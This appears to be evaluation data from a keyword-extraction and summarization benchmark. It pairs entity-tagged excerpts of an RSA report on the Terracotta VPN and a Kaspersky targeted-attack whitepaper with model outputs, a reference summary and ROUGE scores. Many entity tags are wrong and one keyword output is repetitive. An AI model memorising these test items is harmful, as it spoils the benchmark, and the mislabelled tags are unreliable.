[ORG] Level scores from low single - digit numbers to well above [CARDINAL] 100 when the GDS520 Gh0st [ORG] RAT was installed . Figure [CARDINAL] 18 . Raised threat level scores indicate malware infection on server and workstationDouble clicking on the workstation in the [ORG] RSA ECAT console will bring up details about the system , where an analyst can drill- down into the network connections , and responsible processes . In Figure [CARDINAL] 19 , a [ORG] Security [ORG] Operations [ORG] Center ( SOC ) analyst would be alerted by ( illustrated in red boxes ) the high score , [GPE] the [GPE] Suspicious [GPE] Threads , and then hone in on the Gh0st C2 connections identified by [ORG] RSA ECAT.Figure [CARDINAL] 19 . Suspicious network connections to [ORG] the [ORG] Gh0st [ORG] C2 [ORG] Domain as seen in RSA ECAT console26Figure [CARDINAL] 20 . [ORG] RSA [ORG] ECAT uses IIOCs to identify floating code employed by Gh0st [ORG] RAT malwareIn our Gh0st [ORG] RAT malware scenario , the [ORG] SOC analyst would be able to identify the infections of a server and workstation in [ORG] RSA [ORG] Security [ORG] Analytics . The red boxes in Figure [CARDINAL] 20 illustrate Gh0st RAT protocol detection and botnet threat categorization by [ORG] RSA [ORG] Security [ORG] Analytics . An analyst also might notice the unusual communications port.27Figure [CARDINAL] 21 . [ORG] RSA [ORG] Security [ORG] Analytics alerts on system infected with Gh0st [ORG] RAT as it calls back to C2 IPaddress on port [CARDINAL] 808628While the particular variant of the [ORG] Mitozhan [ORG] Trojan described in this paper \u2019s malware analysis section has been neutralized by [ORG] RSA [ORG] Research with the seizure of its C2 domain ; it is likely that other variants with different C2 domains persist . [ORG] RSA developed a [GPE] Lua parser to detect [ORG] Mitozhan [ORG] Command and Control ( C2 ) activity , now available through RSA Live and included as an appendix . Figure [CARDINAL] 22 is a redacted screenshot showing the [ORG] Mitozhan [ORG] Lua parser in action as it alerts on [ORG] Mitozhan [ORG] C2 activity on a [ORG] RSA [ORG] Research sinkhole . Figure [CARDINAL] 22 . LUA Parser used to detect the Mitozhan C2 Activity in RSA Security Analytics29Mitozhan [GPE] Trojan is also readily detected upon initial scan with RSA ECAT . Figure [CARDINAL] 23 shows the initial [ORG] RSA ECAT console display for the infected system , with initial indicators marked in red boxes . Figure [CARDINAL] 23 . [ORG] RSA [ORG] ECAT console shows infection with [GPE] Mitozhan . Note the high threat score , file name withrandom letters , and the unsigned executable with [NORP] Chinese nameWhile RSA ECAT can detect a never - before - seen malware infection out - of - the - box without signatures , a well - prepared [ORG] SOC will have signatures to help identify the threats behind the malware . That is where the built - in [GPE] Yara features of [ORG] RSA [ORG] ECAT really shine . [PERSON] Yara is an open source tool that helps threat intelligence analysts and malware researchers classify and identify malware with granularity that no antivirus product can match . Using the [ORG] Yara signature included in the [NORP] Appendix , our example SOC analyst homes in on a suspicious rasauto.dll process identified by [ORG] RSA [ORG] ECAT as unsigned in Figure [CARDINAL] 24 . By right - clicking on the suspicious process , the analyst can initiate a [GPE] Yara scan using pre - configured rulesFigure [CARDINAL] 24 . [ORG] ECAT \u2019s [ORG] YARA integration allows the [ORG] SOC analyst or incident responder to quickly identifymalware that may be associated with a specific threat30In this scenario , the [ORG] SOC analyst has used [ORG] ECAT to scan the suspicious process . As illustrated with the red box on the right of Figure [CARDINAL] 25 , the [ORG] Yara result is a confirmed infection with [PERSON] Liudoor . The Liudoor YARA signature is included in the AppendixFigure 25 . [ORG] RSA [ORG] ECAT indicates the [ORG] YARA scan results . [ORG] Backdoor [ORG] Liudoor found!For more technical details on how RSA ECAT can be used to proactively detect malware not discovered by traditional methods including antivirus , refer to the whitepaper [ORG] RSA Incident Response : An [ORG] APT Case Study.url Domains31PREVENTIONTerracotta VPN operators are not using sophisticated methods to harvest their [ORG] VPN nodes from vulnerable organizations around the world . [ORG] RSA [ORG] Research assesses that any one of the following hardening steps would have prevented each of the confirmed victim compromises:1 Block port [CARDINAL] 135 on external router and/or firewalla . There is no known business - use for having port [CARDINAL] 135 exposed to the [LOC] Internetb . Recommend : hardware firewall configured with \u201c allow inbound by exception \u201d policy2 Rename \u201c Administrator \u201d account on all Windows systems to a unique alphanumeric name3 Use a strong ( bi - case letters , numbers plus multiple special characters ) [CARDINAL] 15 character+ password that does not use keyboardpatternsa . [PERSON] Keyboard patterns are found in nearly all password cracking dictionariesb . Recommend : regularly change passwordsIn contrast to the simple security controls that can prevent enlistment of an enterprise \u2019s Windows servers into the Terracotta VPN node ecosystem , detecting advanced threat actors who are using [ORG] Terracotta [ORG] VPN nodes to hide their origin is more complicated . Infallible prevention may not be possible , and therefore detection is key . Use non - signature - based network analysis and end - point analysis capabilities such as provided by [ORG] RSA [ORG] Security [ORG] Analytics and RSA ECAT to proactively detect and thwart compromise of your organization \u2019s network , before your most valuable asset --- your information \u2014 is compromised . ATTRIBUTION AND PATTERN OF [GPE] LIFETerracotta is a [GPE] PRC - based operation that uses opportunistic , large - scale exploitation methods to obtain and augment a global , highly - marketable VPN service . [ORG] RSA [ORG] Research has no evidence suggesting that advanced threat actors such as [LOC] Shell_Crew , or other suspected nation - state sponsored threat actor group is involved in any of the [GPE] Terracotta exploitation activities . The attractiveness of the [ORG] Terracotta ecosystem to advanced threat actors may be strictly utilitarian : a very low - cost platform for attacks that serves to ultimately reduce the probability of detection . All compromised systems investigated by [ORG] RSA [ORG] Research were enlisted by actors originating primarily from [ORG] IP ranges in [GPE] Dongguan and other areas of the [GPE] Guangzhou megalopolis , or from the city of [GPE] Wuhan . The Terracotta exploitation activity from Dongguan took place primarily during [TIME] weekends [TIME] and [TIME] hours outside of the normal mainland [GPE] PRC workday using the following Windows hostname : WEI-270FBC26C38Forensic images reveal this hostname was consistently used in initial victim compromise from late 2013 through [DATE] June [CARDINAL] 2015.Exploitation activity originating from [GPE] Wuhan took place during normal [GPE] PRC work [DATE] week [DATE] days and hours . The following hostname was used : QT-201312081446In Terracotta system compromises investigated in [DATE] 2015 , there appeared to be coordination between the actor(s ) originating from [GPE] Dongguan [GPE] IP addresses , and the actor(s ) originating from [GPE] Wuhan [GPE] IP addresses . In [CARDINAL] six out of [CARDINAL] seven systems examined , the initial [ORG] VPN test connection on a newly compromised server originated from Windows hostname WEI-270FBC26C38 with [GPE] Dongguan [GPE] IP address , which was shortly followed by a [ORG] VPN test connection using the [PRODUCT] Windows hostname [GPE] QT-201312081446 from a [GPE] Wuhan [GPE] IP address . Only after the successful connection from [GPE] Wuhan was completed , did the node appear to be added to the [ORG] Terracotta node list displayed by [ORG] Terracotta brand software clients.32CONCLUSIONSThe Terracotta VPN system is marked by a grey - market anonymization ecosystem that is constructed , at least partially , of hacked servers . The [PERSON] Terracotta node ecosystem appears to enable better anonymity for advanced threat actors than would otherwise be allowed by a more conventional VPN service with a legitimate and transparent node infrastructure . [ORG] APPENDIXMalware Sample [PRODUCT] HashesMalware [PRODUCT] DomainsYara SignaturesC2 Lua ParsersTerracotta User Account Authentication URLsAVAILABLE TO INDUSTRY PARTNERS UPON REQUESTTerracotta VPN Client Marketing Website DomainsTerracotta Software Client Authentication DomainsCurrent Terracotta Node ListEmail conops@rsa.com for more information . AUTHORSKent [NORP] Backman , [PERSON] Primary [PERSON] ResearchAlex [PERSON] Cox , [PERSON] ContributingSteven [PERSON] Sipes , [ORG] ContributingAhmed [ORG] Sonbol , ContributingRSA Incident Response Team , ContributingRSA Labs , [ORG] ContributingThe authors would like to thank a number of colleagues from [ORG] RSA and industry for their advice and assistance on this project.33", "generated_text": "RSA; USE; advanced threat; Detect; malware; MALWARE; ATTACKS; TERRACOTTA VPN; WINDOWS SYSTEM; LAN; DLL; protection; ATTACK DETECTION; DETECTION; MALWARE; WINDOWS SERVER; WINDOWS SERVER ENLISTMENT; NODES; the VICTIMS; TTP; ENTRY; ATTACKS; DETECTION; the TERRACOTTA network; the technique; the IP; address; the VPN; IP address; RAT; the IP; their infrastructure; IP addresses; the IP addresses; the infrastructure; the IP; the RAT; IP addresses; the information; the data; the different types; IP addresses; IP addresses; their RAT; a simple net traffic.", "ref_text": "<START-1>The report exposes a VPN service called Terracotta that operates multiple brands marketed in China. Terracotta has over 1500 nodes globally, at least 30 of which are confirmed to be compromised Windows servers harvested without consent. Terracotta appears to obtain servers by brute forcing remote desktop credentials on Internet-exposed Windows systems. Custom malware like Gh0st RAT and backdoors are installed to control nodes. Nodes are configured to use Terracotta's centralized authentication infrastructure. The report speculates the illicit harvesting of servers and bandwidth significantly reduces Terracotta's operating costs compared to legitimately leasing infrastructure. Nodes masquerade as unrelated organizations rather than being obvious VPN exits. Terracotta is assessed to originate from China based on patterns of life, tools, and operating hours. Nodes have been used by advanced threat actors like Shell_Crew for attacks, taking advantage of the anonymity. Other nation-state activity has been observed originating from Terracotta. The report provides indicators of compromise and recommendations on preventing server compromises through basics like firewalling, renaming admin accounts, and strong passwords. Detection methods include monitoring for VPN authentication traffic and Terracotta-associated malware. Though exploitation tactics are simple, Terracotta represents a concerning trend of hybrid criminal-state actors stealing infrastructure to enable espionage. Defenders must implement controls to prevent servers becoming speechless victims enabling attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3016759776536313, "gpt3/lexical/rouge_rouge2": 0.02808988764044944, "gpt3/lexical/rouge_rougeL": 0.13966480446927373, "gpt3/lexical/rouge_rougeLsum": 0.13966480446927373, "gpt3_generated_text": ["This RSA Research Paper delves into the advanced threat of the Terracotta VPN network, which is utilized by APT actors to obscure the origins of their malicious activities. The network ensnares legitimate commercial and government entities, unknowingly serving as VPN nodes and bandwidth in larger-scale APT cases. Fortunately, enlistment in the Terracotta network is preventable through well-established cybersecurity practices, and detection and mitigation for enlisted systems are feasible. The report also discusses the technique and IP addresses used by the Terracotta network, as well as the detection of malware and attacks associated with it. Additionally, it provides information on the different types of IP addresses and their use by the network, as well as the infrastructure and RAT associated with it. Overall, the paper emphasizes the importance of detecting and protecting against the threats posed by the Terracotta VPN network."]}, {"split_name": "test", "sample_id": "test_103", "prompt_text": "Extract the keywords: www.kaspersky.com # truecybersecurityThe growing risk of advanced threats and targeted attacksEnterprise Threats LandscapeTargeted attacks and advanced threats \u2013 including [WORK_OF_ART] Advanced [WORK_OF_ART] Persistent [WORK_OF_ART] Threats ( APTs ) \u2013 are some of the most dangerous risks to enterprise systems . However , while the threats and techniques that cybercriminals use are constantly evolving , too many organizations are relying on [DATE] yesterday \u2019s security technologies and an outmoded mindset to protect against [DATE] today \u2019s and [DATE] tomorrow \u2019s threats . Advanced , specially targeted threats can go undetected for [DATE] weeks , [DATE] months , or even years , while their actors slowly and silently gather information and work incrementally to exploit the unique vulnerabilities in their chosen targets \u2019 systems . Unlike regular malware , advanced , targeted threats are actively controlled and managed by the perpetrators . The goal is n\u2019t limited to malware delivery : the objective is to persist inside the enterprise perimeter . These attacks are the result of patient , often painstaking research by actors who are prepared to play a waiting game in the quest for their prize . Average loss from a single targeted attack : Average loss from a single targeted attack : [ORG] Additional [ORG] Internal [ORG] Sta\ufb00 [ORG] WagesDamage to [ORG] Credit Rating / Insurance PremiumsLost BusinessesCompensationExtra PR ( to repair brand [ORG] damage)Empoying [ORG] External [ORG] Professionals$126K$116K$106K$92K$91K$86KImproving [ORG] Software [ORG] & [ORG] Infrastructure$119KTrainingNew [ORG] Sta\ufb00$79K$77K$891KInternal and [NORP] External factors which leads to successful breachKey factors contributing to the successful development of targeted attacks on IT infrastructures include:\u2022 [GPE] Hidden and Shadow IT \u2022 Uncontrolled connectivity of [NORP] IoT devices [ORG] \u2022 [ORG] Critical reliance on digitalisation \u2022 Lack of preventive capabilities and an over - optimistic view of currentperimeter security\u2022 Low employees awareness of information security risks \u2022 Lack of visibility over the IT environment and particularly network routing \u2022 Proprietary and outdated software and operating systems \u2022 Lack of security team qualification regarding malware research , digitalforensics , incident response and threat intelliegence200 % growth of the recovery initiated at [DATE] the [DATE] same [DATE] day [DATE] and [DATE] after [DATE] week of discovering a security breach for [ORG] Enterprises*.*Results from [ORG] Kaspersky [ORG] Lab \u2019s [ORG] Corporate [ORG] IT [ORG] Security [ORG] Risks [ORG] Survey [ORG] 2016 , conducted worldwide by [PERSON] Kaspersky Lab15 % of enterprises have experienced a targeted attack , [PERCENT] more [PERCENT] than 53 % losing sensitive data as [PRODUCT] a [PRODUCT] result*.*Kaspersky [PRODUCT] Global [PRODUCT] IT [PRODUCT] Security [PRODUCT] Risks [PRODUCT] Report 2015Every corporation big enough to occupy a significant place in its market is a potential target . This does n\u2019t mean smaller businesses are immune \u2013 in many cases , criminals view them as an easy - to - breach stepping stone from which to reach the bigger target . But when it comes to market leaders , the odds in favor of becoming a victim of such an attack increase substantially . It \u2019s not a case of \u2018 if \u2019 but \u2018 when\u2019 \u2026 Who \u2019s doing the attacking?Cybercriminals \u2013 who sell data to the highest bidder or simply steal money . They usually develop their cyber tools themselves or buy them on the dark web . Competitor businesses \u2013 looking for confidential data or even committing sabotage . They will usually \u2018 buy in \u2019 the services of cyber - mercenaries . Cyber - mercenaries \u2013 masters of cyber- espionage , they develop their own tools and sell their \u2018 services \u2019 to the highest bidder . Hacktivists \u2013 claim to be working for a \u2018 greater good \u2019 , they \u2019re inventive , use complex toolsets and present a serious problem for any organization that attracts their attentionGovernment agencies \u2013 they may deny it , but it \u2019s generally accepted that governments the world over routinely track individuals , groups and businesses . Their toolsets can be extremely sophisticated , expensive and hard to detect.1What \u2019s the risk?Risks to all organisations:\u2022 [ORG] Unauthorized transactions [ORG] \u2022 [ORG] Critical data theft or corruption \u2022 Stealth process manipulation \u2022 Undermining by Competitors \u2022 Blackmail extortion \u2022 Identity theftRisks to key industry sectors : Financial Services\u2022 Unauthorized transactions \u2022 [ORG] ATM attacks with physical cash theft \u2022 Identity theftGovernment\u2022 Data manipulation [ORG] \u2022 [ORG] Espionage \u2022 Restricted availability of online services \u2022 Identity theft \u2022 Hacktivism actsManufacturing and High Technology\u2022 Espionage ( know how ) \u2022 Compromized critical technologicalprocessesTelecommunication\u2022 Attack on corporate clients usingtelecoms infrastructure\u2022 Manipulation of mail serversfor social engineering\u2022 Billing control \u2022 Manipulation of web resourcesfor phishing purposes\u2022 Using compromised infrastructure(devices / IoTs ) for DDoS attacksEnergy and Utilities\u2022 Manipulating with calculations data \u2022 Attacks on technological networkswith physical damageMass media\u2022 Hacktivism \u2022 Compromized web site ( deface , phishing ) and spreading attacks on mass audienceHealthcare\u2022 Theft of patient information \u2022 Attacks on telemedicine equipmentTargeted Attacks \u2013 Cybercrime as a [ORG] Business [ORG] ProfessionMost targeted attacks are overseen by highly experienced cybercriminals and hackers who know how to adapt each phase of their attack to slip past traditional defenses , exploit weaknesses and maximize the amount of valuables they can steal , including money , confidential data and more . The security geek attackers of the past have metamorphosed into professional for whom cybercrime is a business . Their sole motivation in targeting and attacking any enterprise is optimum profit \u2013 calculated even before launching the attack , on the basis of the associated costs and potential rewards . The objective is , of course , to minimize up - front costs by attacking as cheaply as possible , with maximum financial outcomes . Most targeted attacks use a combination of social engineering and a customized toolset . The cost of launching an effective targeted attack has fallen significantly , with a commensurate increase in the total number of attacks globally . So what \u2019s at stake when an organization like yours falls victim to a targeted attack?Direct damageReactive spendRemediation+Lost opportunities+Systems+Sta(cid:31)ng+DowntimeTrainingTo prevent furtherbreachesDirect financial losses . Attackers may try to commit cyber - fraud by stealing banking credentials in order to access corporate accounts and conduct fraudulent transactions . Disruption of key business processes . While some attacks may \u2013 merely as a by - product \u2013 impair or slow down critical business processes , others may deliberately set out to sabotage them . Even if an attack is discovered , there \u2019s likely to be a further period of disruption while the targeted business conducts investigations and recovers its operations , during which further business opportunities may be lost . Clean - up costs . After an attack , you can be faced with having to cover a whole host of expenses that have n\u2019t been budgeted for . Recovering systems and processes is likely to involve both capital expenditure and operational expenses \u2013 like hiring security and systems consultants.2Anatomy of a [ORG] Targeted [ORG] AttackIn theory , the targeted attack kill chain seems pretty straightforward : [ORG] Reconnaissance [ORG] & Testing , Penetration , [ORG] Propagation , Execution , Outcome . This might suggest that by automatically blocking the [ORDINAL] first steps of a multi - stage attack , the attack itself can be thwarted.\u2022 Gather data \u2022 Prepare strategy\u2022 New domain \u2022 \u00ab Gray domain \u00bb \u2022 Payload / command delivery\u2022 Rapid \u2022 Silent \u2022 No immediate damageAttackpreparationDeliveryC&CLateralmovementExecutionDamage & silent leave\u2022 Non - malware \u2022 Hidden \u2022 Encrypted\u2022 Hide inside normal activities \u2022 [ORG] Steal credentials \u2022 Non violation of anything\u2022 Hide the traces \u2022 Erase from logs \u2022 Leave a backdoorTargeted attacks are long - term processes that compromise security and give the attacker unauthorized control over the victim \u2019s IT \u2013 helping the attacker to avoid detection by traditional security technologies . Although some attacks may use [WORK_OF_ART] Advanced [WORK_OF_ART] Persistent [WORK_OF_ART] Threats ( APTs ) \u2013 which can be very effective , but expensive to implement \u2013 others may use a single technique , such as advanced malware or a [DATE] zero - [DATE] day exploit . But in reality , targeted attacks are highly sophisticated and nonlinear in terms of their progression and execution . So automated detection capabilities , continuous monitoring and threat hunting should all be in place as part of a multi - stage defense strategy . A targeted attack is a lengthy process that violates security and allows a cybercriminal bypassing authorization procedures and interacting with the IT infrastructure , so avoiding detection by traditional means . So [ORDINAL] first of all , itirst process \u2013 an ongoing activity , a project , rather than a [CARDINAL] one - off malicious action . According to our experience in monitoring global attacks , such operations tend to last [DATE] at [DATE] least [DATE] 100 [DATE] days , and for government agencies , large market players and critical infrastructures , the time can be calculated in [DATE] years . [ORDINAL] Secondly , the process is aimed at a specific infrastructure , designed to overcome specific security mechanisms , and may well initially involve targeting named employees through email or social media . This is a very different approach from the mass mailings of standard malicious software based attackers , who are pursuing completely different goals . In the case of a targeted attack , the methodology and kill chain stages are built around the specific victim . [ORDINAL] Thirdly , this operation is usually managed by an organized group or team of professionals , sometimes international , armed with sophisticated technical tools . Their activities could be said to be not just a project : more of a multi - combat operation . For example , attackers might typically compile a list of employees who can potentially become the \u2018 gateway \u2019 to the target organization , networks , and study their online profiles and social media activity . After that , the task of gaining control over the victim \u2019s working computer is virtually solved . On the employees computer is infected , and intruders go on to seize control of the network from where they can direct their criminal activities.3Enterprise Security challengesWith the risk of sophisticated threats growing exponentially , many enterprises already implement technologies and services in the hope of achieving the next level of visibility and protection against current threats . But without a multi - faceted approach and strategic planning , these efforts can fall short of expectations . A word on sandboxesDisappointing outcomes of \u2018 patchy \u2019 or unstructured security investment can include : Many \u2018 targeted attack detection solutions \u2019 on the market simply comprise a standalone sandbox . Even vendors with no track record in new , advanced threat discovery claim to offer sandboxes that are often little more than an extension of their anti - malware engines \u2013 and have no significant threat intelligence behind them . [PERSON] Kaspersky [PERSON] Lab \u2019s advanced sandbox is just another part of our integrated detection capabilities . It \u2019s been developed directly out of our in - lab sandbox complex , the technology we \u2019ve been using for [DATE] more [DATE] than [DATE] a [DATE] decade . Its capabilities have been honed on statistics gathered from [DATE] ten [DATE] years of threat analysis , making it more mature and more focused on targeted threats than the silver bullet \u2019 sandbox solutions currently of offer.1 . Major investment in a sandbox , in standalone technologies , or in the constructionof a [ORG] SOC , any of which then fail to generate commensurate improvements in security outcome . Perimeter security techniques like firewalls and anti - malware software can hold their own against some of the more opportunistic attacks . But targeted attacks are a different matter . Some vendors have sought to address APTs using a variety of standalone , discrete products : sandboxes , network anomaly analysis or even endpoint - focused monitoring . While these individual elements all can \u2013 and do \u2013 offer some protection and blocking of the cybercriminal \u2019s toolset , they \u2019re not enough in themselves to uncover a targeted , coordinated attack . To achieve this requires the detection of multiple events occurring across all levels of the enterprise infrastructure . The information gained can then be processed using a multi- layered analysis system , followed by interpretation applying real - time security intelligence from a trusted source . In other words , your best investment is an approach that integrates the best of many technologies , including sandboxing with network anomalies analysis and endpoint events analysis into an overall , end - to - end process.2 . Current solutions generate too many security events for your SOC teamto process , analyze , triage , and respond to within a reasonable timeframe.3 . Lack of security skills appropriate to current levels of threat sophistication . Security experts may be skilled in incident detection and fast remediation ( golden image , blacklisting URLs / files , building some rules ) but not fully qualified to implement a full circle response process ( qualifying risk levels , performing initial analyses , investigation , containment , forensics)4 . Lack of operational visibility . During a targeted attack , cybercriminals can easilyevade traditional security solutions by using stolen credentials and legitimate software , so that they are not apparently creating any systems violations . Because attackers do their utmost to hide their malicious activities , it can be very difficult for an in - house IT security team to spot an attack \u2013 and that means the attackers can continue to cause damage over an extended period . The reality is that malware is responsible for [PERCENT] only 40 % of breaches \u2013 as we \u2019ve seen , threat actors use a variety of techniques to access company systems . Even when malware is used , 70 - 90 % of it is is unique to the organization it \u2019s found in ( [NORP] Verizon : Data Breach Investigation Report).5 . Difficulty in knowing what expertise to employ and grow in - house , what securitytasks to outsource , and what can safely be left to automated systems . With the growing severity of security incidents and their potential impact on overall business effectiveness , [CARDINAL] one of the main security department challenges is that of fielding a sufficient number and range of appropriately qualified experts . A fully effective security strategy requires not just continuous monitoring and detection capabilities but a fast response and qualified remediation , with appropriate forensic processes in place . Conventional SOC teams tend to focus on only part of this task \u2013 detection and response . The implementation of automated solutions helps free up experts to undertake the next steps in the incident management process , but few enterprises are ready to perform every high level task in - house . So the challenge is in identifying which elements of the overall process ( management , qualifying the risk , prioritization , fast recovery ) should be undertaken by the in - house team and which ( malware research , digital forensic , incident response , threat hunting ) may be more effectively outsourced to specialists.4The Intelligence - driven Enterprise SOCCybercriminals have adapted their techniques to sidestep traditional defenses and lurk undetected in systems for [DATE] months , or even years . It \u2019s time for enterprise security to adapt in its turn , by taking an intelligence - driven , multi - layered approach to IT security . Until recently , it was enough to defend the corporate perimeter using commonly available security technologies that prevented malware infections or unauthorized access to the corporate network . However , [DATE] today , with the rise of targeted attacks , this simple approach is no longer adequate . If your security department is going to guard against new dangers , you \u2019ll need a multi - faceted , highly adaptable approach to security , based around a conventional SOC empowered with threat intelligence and multi - layered security solutions . Intellegence - DrivenSecurity [ORG] Operations [ORG] CenterAdvanced [ORG] & [ORG] CorrelationTicketingReportingAdaptive [ORG] Security StrategyPreventDetectRespondPredictImproving enterprise security [ORG] processesThe [ORG] Information [ORG] Security [ORG] Department is responsible for the organizational and technical protection of critical information and business processes in often complex IT environments . This includes , for example , the increasing adoption of automated solutions and software components , and the transition to electronic document management . The avalanche - like growth in the number of advanced threats and targeted attacks has generated increasing numbers of solutions . In order to collect , store and process the unstructured data generated , in order to identify and prioritize complex multi - level attacks , existing processes must be upgraded . These include:\u2022 the manual prioritization of threats and the evaluation of factors potentiallyindicative of a possible targeted attack Information collecting about targeted attacks and advanced statistics threats ; identification of and response to incidents;\u2022 \u2022 \u2022 analysis of suspicious objects in network traffic and email attachments \u2022 detection of abnormal / unusual activity within the protected infrastructureLarge enterprises are responding to [DATE] today \u2019s advanced threats by moving to centralized information security management , consolidating data from disparate Security solutions ( through automating data collection and correlation of events \u2013 SIEM ) and unifying its presentation through the construction of security monitoring centers ( SOC , [ORG] Security [ORG] Operations [ORG] Center ) . But for this approach to be effective against targeted attacks and advanced threats , a comprehensive understanding of security problems and the deep knowledge of cyberthreat analysis is required.5Kaspersky Lab was the [ORDINAL] first technology company to establish a dedicated advanced threat lab , back in 2008.That \u2019s how we have uncovered more advanced , targeted threats than any other security vendor . When you hear in the news about the latest advanced persistent threat , the chances that it was detected by [PERSON] Kaspersky [PERSON] Lab \u2019s elite [ORG] Global [ORG] Research [ORG] and [ORG] Analysis [ORG] Team ( GReAT).With an enviable track record in detecting targeted attacks and APTs , Our [ORG] GReAT team is renowned for its threat intelligence . The team has played a major role in discovering many of the most sophisticated attacks , [ORG] like:\u2022 [ORG] Stuxnet [ORG] \u2022 Epic Turla\u2022 DarkHotel \u2026 and many more . [PERSON] Kaspersky [PERSON] Anti [PERSON] Targeted [PERSON] Attack : Protection from [ORG] Complex [ORG] ThreatsThreat [ORG] Management and Defense solutionKaspersky Lab \u2019s understanding of the inner workings of some of the world \u2019s most sophisticated threats has enabled us to develop a strategic portfolio of technologies and services capable of delivering a fully integrated , adaptive security approach . Our expertise has seen [PERSON] Kaspersky [PERSON] Lab achieve more [ORDINAL] first place rankings in independent threat detection and mitigation tests than any other IT security company . Now , we \u2019ve brought this targeted attack detection expertise together into one standalone solution \u2013 the culmination of a [DATE] two [DATE] decade \u2019 s worth of threat research and analysis , generating mature , proven technologies . While the majority of simple cyberthreats can be blocked by traditional , signature- based and heuristics - enhanced security products , [DATE] today \u2019s cybercriminals and hackers are using increasingly sophisticated attacks \u2013 to target specific organizations . Targeted attacks \u2013 including [WORK_OF_ART] Advanced [WORK_OF_ART] Persistent [WORK_OF_ART] Threats ( APTs ) \u2013 are now one of the most dangerous risks that enterprises have to deal with . However , while the threats \u2013 and the techniques that cybercriminals and hackers employ \u2013 are constantly evolving , many businesses are failing to adapt their security strategies . By combining multi - layered detection from [FAC] the [FAC] Kaspersky [FAC] Anti [FAC] Targeted [FAC] Attack Platform and rapid reactions in [ORG] Kaspersky [ORG] Endpoint [ORG] Detection and [ORG] Response with [ORG] Cybersecurity [ORG] Intelligence [ORG] Services and Premium Support \u2013 Kaspersky Threat Management and [ORG] Defense provides a unified solution with centralized administration , helping to automate and facilitate the whole advanced threat management cycle . Harder to detect and \u2013 often \u2013 even harder to eliminate , targeted attacks and advanced threats call for a comprehensive , adaptive security strategy . [ORG] Kaspersky [ORG] Threat [ORG] Management and Defense solution is founded on the most viable security architecture as described by [PERSON] Gartner . Our approach is to provide a cycle of activities in [CARDINAL] four key areas : Prevent , [GPE] Detect , [PERSON] Respond , and Predict.\u2022 Prevent \u2013 reduce the risk of advanced threats and targeted attacks \u2022 Detect \u2013 identify activities that could signal a targeted attack \u2022 Respond \u2013 close security gaps and investigate attacks \u2022 Predict \u2013 where and how new targeted attacks could appearKasperskyCybersecurityServices : Security Insights Full VisibilityEssentially , this assumes that traditional prevention systems should function in coordination with detection technologies , threat analytics , response capabilities and predictive security techniques . This helps to create a cybersecurity system that continuously adapts and responds to emerging enterprise challenges . Predict\u2022 Analyze the potential security gaps \u2022 Adjust the countermeasure accordingly [ORG] \u2022 [ORG] Empower [ORG] SOC with [ORG] Threat [ORG] Intelligence [ORG] \u2022 Proactive Threat HuntingRespond\u2022 Incident Management \u2022 Investigate the incident \u2022 Neutralize with immediate steps to mitigate the consequences \u2022 Recover6Prevent\u2022 Mitigate the risks \u2022 Raise the awareness \u2022 [GPE] Harden target systems and assets \u2022 Improving quali\ufb01cation and current solution e(cid:173)ectiveness against \u2022 modern threatsDetect\u2022 [PERSON] Continuous monitoring \u2022 Incident Discovery \u2022 Qualifying Incidents severity \u2022 and risk levelPrevention \u2013 using award - winning security technologies to decrease the risk of targeted attacksFor targeted attacks , prevention technologies are valuable in filtering out unnecessary incidents , common malicious objects and irrelevant communications . But comprehensive system hardening with targeted security solutions , security education and by raising awareness is also of value \u2013 increasing the amount of time and investment necessary for attackers to invest in penetrating your controlled perimeter , and rendering you no longer cost - effective to attack . Prevention - based security products can be very effective in protecting against common threats \u2013 including malware , network attacks , data leakage and more . But even these technologies are not sufficient to protect a business against the targeted attacks . During a targeted attack , conventional , prevention - based security technologies may spot some incidents but will usually fail to determine that t individual incidents are part of a much more dangerous and complex attack that could be causing severe damage to your business \u2026 and will continue to inflict damage over the long term . However , multi - layered , prevention - based technologies are still a key element in the new , proactive approach to guarding against targeted attacks . Machine learning , [ORG] Threat [ORG] Intelligence , advan\u01b9ed sandboxingHeuristics and behavior analysis , cloud reputation$$$$++1 % \u2013 tergeted and unique9 % \u2013 sophisticated attacksSignature and rules based approachCheap $ 90 % \u2013 genetic malwares and common threatsAddressing di(cid:31)erent threats with security technologies80 % of targeted attacks start with a malicious email containing an attachment or link . It \u2019s essential for enterprise organizations to continue using \u2018 traditional \u2019 security technologies to : Preferred penetration targets for cybercriminals include HR , call centers , personal assistants to senior management and outsourced areas of the business . These are seen as the least prepared areas of the organization.1 . Automate the filtering and blocking of events and incidents not related to Targetedattacks . which will help to avoid unnecessary distractions to relevant incident discovery2 . [GPE] Harden IT infrastructure against cheap and easy - to - perform techniques ( social engineering , removable devices , mobile devices , malware and malicious email delivery etc . ) . In fact all past spending to perimeter and endpoint security , along with controls implemented , helps to increase amount of effort and investment required by cybercriminals in order to penetrate your network . But if the attacker is sufficiently highly motivated , and perhaps even hired by a [ORDINAL] third party to conduct a successful attack , a prevention - only approach will not be [PERSON] enough.7The [PERSON] Kaspersky [PERSON] Anti [PERSON] Targeted [PERSON] Attack platform includes:\u2022 Multi - layered sensor architecture \u2013 to give \u2018 all round \u2019 visibility . Through a combination of network , web [ORG] & email , and endpoint sensors , [ORG] KATA provides advanced detection at every level of your corporate IT infrastructure\u2022 Advanced Sandbox \u2013 to assess new threats . The result of over [DATE] a [DATE] decade of continuous development , our [PERSON] Advanced [PERSON] Sandbox offers an isolated , virtualized environment where suspicious objects can be safely executed so their behavior can be observed\u2022 Powerful analytical engines \u2013 for rapidverdicts and fewer false positives . Our Targeted Attack Analyzer assesses data from network and endpoint sensors and rapidly generates threat detection verdicts for the security team . Detection \u2013 multi - vector advanced threat discovery before the damage occursThe earlier you detect an attack , the lower your financial losses and the less disruption your organization will suffer . So the quality and effectiveness of detection is paramount . Because targeted attacks are both compound and complex , detecting them calls for a deep practical knowledge about how advanced and targeted attacks work . Simple anti - malware solutions are not able to defend against these types of attack . Instead , you \u2019ll need detection technologies that can access up - to - the- minute threat intelligence data \u2013 and can perform detailed analyses of suspicious behavior that may be occurring at different levels of your corporate network . The ability to detect targeted attacks consists of connected solutions and services able to deliver:\u2022 Training \u2022 Targeted Attack [PRODUCT] Discovery expertise \u2013 [CARDINAL] one - time audit of infrastructure inorder to find traces of compromise\u2022 Specialized solution [PERSON] \u2013 [PERSON] Kaspersky [PERSON] Anti [PERSON] Targeted [PERSON] Attack platform + [PERSON] Kaspersky [PERSON] Endpoint [PERSON] Detection and Response\u2022 Threat Data Feeds for real - time threat exchange and updates about new threats \u2022 [ORG] Custom and [ORG] APT reports for better 